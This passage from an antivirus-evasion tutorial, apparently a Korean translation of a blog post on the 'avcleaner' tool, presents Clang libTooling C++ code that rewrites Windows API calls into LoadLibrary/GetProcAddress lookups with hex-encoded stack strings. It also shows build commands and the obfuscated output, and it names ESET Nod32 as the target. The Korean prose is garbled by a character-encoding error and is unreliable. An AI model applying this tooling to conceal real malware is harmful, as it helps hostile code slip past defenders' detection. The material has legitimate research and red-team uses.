ì°¾ê¸° ìœ„í•´ì„œ ì†ŒìŠ¤ ì½”ë“œì—ì„œ custom queryë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” interactive toolì¸ <code>clang-query</code>ë¥¼ ì‚¬ìš©í–ˆë‹¤. í¥ë¯¸ë¡­ê²Œë„ ì´ê²ƒì€ libTooling ê¸°ë°˜ì´ê³  ì´ ê¸€ì—ì„œ ë³´ì—¬ì¤€ ì–´ë–¤ ê²ƒë³´ë‹¤ í›¨ì”¬ ê°•ë ¥í•˜ë‹¤.</p><pre><code class="hljs bash">clang-query&gt; match callExpr(callee(functionDecl(hasName(<span class="hljs-string">&quot;MessageBoxA&quot;</span>))))Match <span class="hljs-comment">#1:</span>/Users/vladimir/dev/scrt/avcleaner/<span class="hljs-built_in">test</span>/messagebox_simple.c:6:5: note: <span class="hljs-string">&quot;root&quot;</span> binds here    MessageBoxA(NULL, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~1 match.clang-query&gt;</code></pre><p>ì‹œí–‰ì°©ì˜¤ì™€ ëª…ë ¹ ì¤„ ì™„ì„±(tab completion)ìœ¼ë¡œ ë¹ ë¥´ê²Œ ì‘ì—… ì†”ë£¨ì…˜ì— ì ‘ê·¼í•  ìˆ˜ ìˆì—ˆë‹¤. matcherê°€ ì˜ ë™ì‘í•˜ëŠ” ê²ƒì„ í™•ì¸í–ˆìœ¼ë‹ˆ ì´ì „ ê¸€ì—ì„œ ìˆ˜í–‰í•œ ê²ƒê³¼ ê°™ì€ ìƒˆë¡œìš´ <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>ë¥¼ ìƒì„±í•  ìˆ˜ ìˆë‹¤. <code>clang-query</code>ë¥¼ ì‚¬ìš©í•˜ì—¬ ìˆ˜í–‰í•œ ê²ƒì„ C++ ì¬í˜„í•˜ëŠ” ê²ƒì´ë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiCallConsumer</span> :</span> <span class="hljs-keyword">public</span> clang::ASTConsumer &#123;<span class="hljs-keyword">public</span>:    ApiCallConsumer(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiName, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> TypeDef, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Library)            : _ApiName(<span class="hljs-built_in">std</span>::move(ApiName)), _TypeDef(<span class="hljs-built_in">std</span>::move(TypeDef)), _Library(<span class="hljs-built_in">std</span>::move(Library)) &#123;&#125;    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleTranslationUnit</span><span class="hljs-params">(clang::ASTContext &amp;Context)</span> <span class="hljs-keyword">override</span> </span>&#123;                <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::ast_matchers;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> AVObfuscator;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;[ApiCallObfuscation] Registering ASTMatcher for &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;        MatchFinder Finder;        <span class="hljs-function">ApiMatchHandler <span class="hljs-title">Handler</span><span class="hljs-params">(&amp;ASTRewriter, _ApiName, _TypeDef, _Library)</span></span>;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> Matcher = callExpr(callee(functionDecl(hasName(_ApiName)))).bind(<span class="hljs-string">&quot;callExpr&quot;</span>);        Finder.addMatcher(Matcher, &amp;Handler);        Finder.matchAST(Context);    &#125;<span class="hljs-keyword">private</span>:    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _ApiName;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _TypeDef;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _Library;&#125;;</code></pre><p>ì¤‘ìš”í•œ êµ¬í˜„ ì„¸ë¶€ ì‚¬í•­ì€ ë§ì€ ë‹¤ë¥¸ í•¨ìˆ˜ë“¤ì— ì ìš©í•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥ì„±ì„ ì œê³µí•˜ëŠ” ê²ƒì´ê³  ìµœì¢…ì ì¸ ëª©í‘œëŠ” ê° ìˆ˜ì •ëœ API í•¨ìˆ˜ì— <code>LoadLibrary/GetProcAddress</code>ë¥¼ ì‚½ì…í•˜ëŠ” ê²ƒì´ë¯€ë¡œ í•¨ìˆ˜ í”„ë¡œí† íƒ€ì…ê³¼ DLL ì´ë¦„ì„ ì œê³µí•´ì•¼ í•œë‹¤.</p><p>ê·¸ë ‡ê²Œ í•˜ë©´ ìˆ˜ì •í•  APIë§Œí¼ ë§ì€ <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumers</a>ë¥¼ ë“±ë¡í•  ìˆ˜ ìˆë‹¤. ì´ <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>ì˜ ì¸ìŠ¤í„´ìŠ¤í™”ëŠ” <a href="https://clang.llvm.org/doxygen/classclang_1_1FrontendAction.html">ASTFrontendAction</a>ì—ì„œ ìˆ˜í–‰ë˜ì•¼ë§Œ í•œë‹¤:</p><p><img src="/2020/12/13/idioth/av_evasion_part2/4.png"></p><p><code>main.cpp</code>ì˜ ì£¼ìš” ë³€ê²½ì .</p><p>ì´ê²ƒì€ ì´ì „ ê¸€ì—ì„œ ì‘ì—…í•œ ê¸°ì¡´ ì½”ë“œì— ëŒ€í•œ ìœ ì¼í•œ ë³€ê²½ì ì´ë‹¤. ìš°ë¦¬ê°€ ì¶”ê°€í•  ì½”ë“œë“¤ì€ <code>ApiMatchHandelr.cpp</code>ë¥¼ ë§Œë“œëŠ” ê²ƒë¶€í„° ì‹œì‘í•œë‹¤.</p><p>matcherëŠ” ì½œë°± í•¨ìˆ˜ì™€ í•¨ê»˜ ì œê³µë˜ë¯€ë¡œ ë‹¤ìŒ í•˜ë‚˜ë¥¼ ì œê³µí•˜ì.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ApiMatchHandler::run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> </span>&#123;    llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Found &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *CallExpression = Result.Nodes.getNodeAs&lt;clang::CallExpr&gt;(<span class="hljs-string">&quot;callExpr&quot;</span>);    handleCallExpr(CallExpression, Result.Context);&#125;</code></pre><p>ì„¹ì…˜ì˜ ì‹œì‘ ë¶€ë¶„ì—ì„œ ë¦¬ìŠ¤íŠ¸ë¡œ ë¶„ë¦¬ëœ ì‘ì—…ë“¤ì€ ì•„ë˜ ë©”ì†Œë“œë¥¼ í†µí•´ ì½”ë“œë¡œ ë°”ê¿€ ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span></span>;<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span></span>;<span class="hljs-keyword">bool</span>addGetProcAddress(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,                    <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName);<span class="hljs-function">clang::SourceRange <span class="hljs-title">findInjectionSpot</span><span class="hljs-params">(clang::ASTContext *<span class="hljs-keyword">const</span> Context, clang::ast_type_traits::DynTypedNode Parent,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> clang::CallExpr &amp;Literal, <span class="hljs-keyword">uint64_t</span> Iterations)</span></span>;</code></pre><h3 id="í•¨ìˆ˜-í˜¸ì¶œ-ëŒ€ì²´"><a href="#í•¨ìˆ˜-í˜¸ì¶œ-ëŒ€ì²´" class="headerlink" title="í•¨ìˆ˜ í˜¸ì¶œ ëŒ€ì²´"></a>í•¨ìˆ˜ í˜¸ì¶œ ëŒ€ì²´</h3><p>ì´ê²ƒì€ ê°€ì¥ ì‚¬ì†Œí•œ ë¶€ë¶„ì´ë‹¤. ëª©í‘œëŠ” ASTì˜ <code>MessageBoxA</code>ë¥¼ ë¬´ì‘ìœ„ ì‹ë³„ìë¡œ ëŒ€ì²´í•˜ëŠ” ê²ƒì´ë‹¤. ì´ëŸ¬í•œ ë¬´ì‘ìœ„ ë³€ìˆ˜ ì´ˆê¸°í™”ëŠ” ë‹¤ìŒ ì„¹ì…˜ì—ì„œ ìˆ˜í–‰ëœë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span> </span>&#123;    <span class="hljs-comment">// generate a random variable name</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Replacement = Utils::translateStringToIdentifier(_ApiName);    <span class="hljs-comment">// inject Run-time dynamic linking</span>    <span class="hljs-keyword">if</span> (!addGetProcAddress(CallExpression, pContext, Replacement, _ApiName))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-comment">// MessageBoxA -&gt; random identifier generated above</span>    <span class="hljs-keyword">return</span> replaceIdentifier(CallExpression, _ApiName, Replacement);&#125;</code></pre><p><a href="https://clang.llvm.org/doxygen/Rewriter_8h_source.html#l00164">ReplaceText</a> Clagn APIëŠ” í•¨ìˆ˜ ì‹ë³„ìì˜ ì´ë¦„ì„ ë³€ê²½í•˜ëŠ” ë° ì‚¬ìš©ëœë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span> </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;ASTRewriter-&gt;ReplaceText(CallExpression-&gt;getBeginLoc(), ApiName.length(), NewIdentifier);&#125;</code></pre><h3 id="LoadLibrary-GetProcAddress-ì‚½ì…"><a href="#LoadLibrary-GetProcAddress-ì‚½ì…" class="headerlink" title="LoadLibrary/GetProcAddress ì‚½ì…"></a>LoadLibrary/GetProcAddress ì‚½ì…</h3><p>ìš°ë¦¬ê°€ ì¶”ê°€í•˜ê³ ì í•˜ëŠ” APIì— Run-time dynamic linkingì„ ì¶”ê°€í•˜ëŠ” ê³¼ì •ì€ ë‹¤ìŒê³¼ ê°™ë‹¤:</p><ul><li><p>translation unitì˜ ìƒë‹¨ í˜¹ì€ enclosing í•¨ìˆ˜ ì•ˆì— API í”„ë¡œí† íƒ€ì…ì„ ì¶”ê°€í•´ë¼. ì‰½ê²Œ í•˜ê¸° ìœ„í•´ ìš°ë¦¬ëŠ” í›„ìë¥¼ ì„ íƒí•˜ì§€ë§Œ ë™ì¼í•œ í•¨ìˆ˜ì—ì„œ APIë¥¼ ì—¬ëŸ¬ ë²ˆ í˜¸ì¶œí•  ê²½ìš° ì´ë¯¸ ì¶”ê°€ë˜ì—ˆëŠ”ì§€ í™•ì¸í•  í•„ìš”ê°€ ìˆë‹¤.</p></li><li><p>ì•„ë˜ ë¼ì¸ì„ ì¶”ê°€í•´ë¼</p><p>  <code>HANDLE &lt;random identifier&gt; LoadLibrary(&lt;library name&gt;);</code></p></li><li><p><code>GetProcAddress</code> í˜¸ì¶œì„ ì¶”ê°€í•´ë¼</p></li></ul><p>ë¬¼ë¡  ì´ ì‘ì—…ì„ í•˜ë©´ì„œ ë¬¸ìì—´ ë¦¬í„°ëŸ´ì„ ì‚½ì…í•˜ì§€ ì•Šê¸° ìœ„í•´ ê° ë¬¸ìì—´ì„ ìŠ¤íƒ ë¬¸ìì—´ë¡œ ì‘ì„±í•´ì•¼ í•œë‹¤. ì´ê²ƒì€ ì½”ë“œë¥¼ ì½ê¸° ì§€ë£¨í•˜ê²Œ ë§Œë“¤ì§€ë§Œ ë³µì¡í•˜ì§„ ì•Šë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::addGetProcAddress</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName)</span> </span>&#123;    SourceRange EnclosingFunctionRange = findInjectionSpot(pContext, clang::ast_type_traits::DynTypedNode(),                                                           *pCallExpression, <span class="hljs-number">0</span>);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">stringstream</span> Result;    <span class="hljs-comment">// add function prototype if not already added</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">std</span>::find(TypedefAdded.begin(), TypedefAdded.end(), pCallExpression-&gt;getDirectCallee()) == TypedefAdded.end()) &#123;        Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; _TypeDef &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    &#125;    <span class="hljs-comment">// add LoadLibrary with obfuscated strings</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryVariable = Utils::translateStringToIdentifier(_Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryString = Utils::generateVariableDeclaration(LoadLibraryVariable, _Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryHandleIdentifier = Utils::translateStringToIdentifier(<span class="hljs-string">&quot;hHandle_&quot;</span>+_Library);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; LoadLibraryString &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\tHANDLE &quot;</span> &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot; = LoadLibrary(&quot;</span> &lt;&lt; LoadLibraryVariable &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    <span class="hljs-comment">// add GetProcAddress with obfuscated string: TypeDef NewIdentifier = (TypeDef) GetProcAddress(handleIdentifier, ApiName)</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameIdentifier = Utils::translateStringToIdentifier(ApiName);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameDecl = Utils::generateVariableDeclaration(ApiNameIdentifier, ApiName);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; ApiNameDecl &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\t_ &quot;</span>&lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; NewIdentifier &lt;&lt; <span class="hljs-string">&quot; = (_&quot;</span> &lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot;) GetProcAddress(&quot;</span>           &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; ApiNameIdentifier &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    TypedefAdded.push_back(pCallExpression-&gt;getDirectCallee());    <span class="hljs-comment">// add everything at the beginning of the function.</span>    <span class="hljs-keyword">return</span> !(ASTRewriter-&gt;InsertText(EnclosingFunctionRange.getBegin(), Result.str()));&#125;</code></pre><h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><pre><code class="hljs cpp">git clone https:<span class="hljs-comment">//github.com/scrt/avcleaner</span>mkdir avcleaner/CMakeBuild &amp;&amp; cd avcleaner/CMakeBuildcmake ..makecd ..</code></pre><p>ì „ë¶€ ì˜ ë™ì‘í•˜ëŠ”ì§€ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ ì•„ë˜ í…ŒìŠ¤íŠ¸ íŒŒì¼ì„ ì‚¬ìš©í•˜ì.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Another test&quot;</span>, <span class="hljs-string">&quot;Another something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>obfuscator ì‹¤í–‰!</p><pre><code class="hljs cpp">./CMakeBuild/avcleaner.bin test/messagebox_simple.c --strings=<span class="hljs-literal">true</span> --api=<span class="hljs-literal">true</span> -- -D _WIN64 -D _UNICODE -D UNICODE -D _WINSOCK_DEPRECATED_NO_WARNINGS\ -I /usr/local/Cellar/llvm/<span class="hljs-number">9.0</span><span class="hljs-number">.1</span>\ -I /Users/vladimir/dev/scrt/avcleaner/Include/msvc<span class="hljs-number">-14.15</span><span class="hljs-number">.26726</span>-include\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/ucrt\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/shared\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/um\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/winrt -w -fdebug-compilation-dir -fno-use-cxa-atexit -fms-extensions -fms-compatibility -fms-compatibility-version=<span class="hljs-number">19.15</span><span class="hljs-number">.26726</span> -<span class="hljs-built_in">std</span>=c++<span class="hljs-number">14</span> -fdelayed-<span class="hljs-keyword">template</span>-parsing -fobjc-runtime=gcc -fcxx-exceptions -fexceptions -fdiagnostics-show-option -fcolor-diagnostics -x c++ -ferror-limit=<span class="hljs-number">1900</span> -target x86_64-pc-windows-msvc19<span class="hljs-number">.15</span><span class="hljs-number">.26726</span> -fsyntax-only -disable-<span class="hljs-built_in">free</span> -disable-llvm-verifier -discard-value-names -dwarf-column-info -debugger-tuning=gdb -momit-leaf-frame-pointer -v</code></pre><p>ê²°ê³¼ í™•ì¸!</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Someth_lNGj92poubUG[] = &#123;<span class="hljs-string">&#x27;\x53&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x69&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_UP7KUo4Sa8LC[] = &#123;<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_ACsNhmIcS1tA[] = &#123;<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x69&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</span></span>;    TCHAR hid_User___Bhk5rL2239Kc[] = &#123;<span class="hljs-string">&#x27;\x55&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x33&#x27;</span>,<span class="hljs-string">&#x27;\x32&#x27;</span>,<span class="hljs-string">&#x27;\x2e&#x27;</span>,<span class="hljs-string">&#x27;\x64&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hid_hHandl_PFP2JD4HjR8w = LoadLibrary(hid_User___Bhk5rL2239Kc);    TCHAR hid_Messag_drqxgJLSrxfT[] = &#123;<span class="hljs-string">&#x27;\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x61&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x42&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x78&#x27;</span>,<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA hid_Messag_1W70P1kc8OJv = (_MessageBoxA) GetProcAddress(hid_hHandl_PFP2JD4HjR8w, hid_Messag_drqxgJLSrxfT);    TCHAR hid_User___EMmJBb201EuJ[] = &#123;<span class="hljs-string">&#x27;\x55&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x33&#x27;</span>,<span class="hljs-string">&#x27;\x32&#x27;</span>,<span class="hljs-string">&#x27;\x2e&#x27;</span>,<span class="hljs-string">&#x27;\x64&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hid_hHandl_vU1riOrVWM8g = LoadLibrary(hid_User___EMmJBb201EuJ);    TCHAR hid_Messag_GoaJMFscXsdw[] = &#123;<span class="hljs-string">&#x27;\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x61&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x42&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x78&#x27;</span>,<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA hid_Messag_6nzSLR0dttUn = (_MessageBoxA) GetProcAddress(hid_hHandl_vU1riOrVWM8g, hid_Messag_GoaJMFscXsdw);hid_Messag_1W70P1kc8OJv(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, hid_Someth_lNGj92poubUG, MB_OK);    hid_Messag_6nzSLR0dttUn(<span class="hljs-literal">NULL</span>, hid_Anothe_UP7KUo4Sa8LC, hid_Anothe_ACsNhmIcS1tA, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ë³¼ ìˆ˜ ìˆë“¯ì´ ë¬¸ìì—´ ë‚œë…í™”ì™€ API ë‚œë…í™” íŒ¨ìŠ¤ì˜ ì¡°í•©ì€ ìƒë‹¹íˆ ê°•ë ¥í•˜ë‹¤. <code>Test</code> ë¬¸ìì—´ì€ ì‘ì€ ë¬¸ìì—´ì€ ë¬´ì‹œí•˜ëŠ” ê²ƒìœ¼ë¡œ ê²°ì •í–ˆê¸° ë•Œë¬¸ì— ë‚¨ì•„ìˆë‹¤. ê·¸ í›„ ë‚œë…í™” ì†ŒìŠ¤ ì½”ë“œëŠ” ë¹Œë“œí•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp">$ cp test/messagebox_simple.c.patch /tmp/test.c$ x86_64-w64-mingw32-gcc /tmp/test.c -o /tmp/toto.exe</code></pre><p>ìœˆë„ìš°10 ê°€ìƒ ë¨¸ì‹ ì—ì„œ í…ŒìŠ¤íŠ¸ ê²°ê³¼ ì›ë˜ ê¸°ëŠ¥ì´ ê³„ì† ì‘ë™í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤. ë” ì¤‘ìš”í•œ ê²ƒì€ ë‚œë…í™”ëœ ë°”ì´ë„ˆë¦¬ì— <code>MessageBox</code> ë¬¸ìì—´ì´ ì—†ë‹¤.</p><pre><code class="hljs cpp">$ rabin2 -zz /tmp/toto.exe | grep MessageBox | wc -l  <span class="hljs-number">0</span></code></pre><h3 id="Generalisation"><a href="#Generalisation" class="headerlink" title="Generalisation"></a>Generalisation</h3><p>ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ ESET Nod32 ê´€ë ¨í•´ì„œ ìš°ë¦¬ëŠ” <code>samlib.dll</code>ê³¼ ê´€ë ¨ëœ API imports ì¤‘ íŠ¹íˆ ì•„ë˜ì— ìˆëŠ” APIë“¤ì„ ìˆ¨ê¸°ëŠ” ê²ƒì´ ì¤‘ìš”í•˜ë‹¤ëŠ” ê²ƒì„ 